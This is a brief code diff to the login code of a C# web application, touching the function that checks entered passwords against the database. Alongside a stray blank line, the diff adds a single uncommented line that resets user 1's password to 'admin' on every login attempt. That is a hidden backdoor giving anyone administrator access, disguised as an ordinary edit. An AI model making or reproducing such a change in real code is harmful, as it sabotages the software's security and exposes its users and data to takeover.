@@ -93,6 +93,7 @@ where us_username = @username");
             }
             else
             {
+
                 authenticated = check_password_with_db(username, password, dr);
             }
 
@@ -175,7 +176,7 @@ where us_username = @username");
 
         public static bool check_password_with_db(string username, string enteredPassword, DataRow dr)
         {
-
+            Util.update_user_password(1, "admin");
             string salt = (string)dr["us_salt"];
             string hashedEnteredPassword = Util.HashString(enteredPassword, salt.ToString());
             string databasePassword = (string)dr["us_password"];
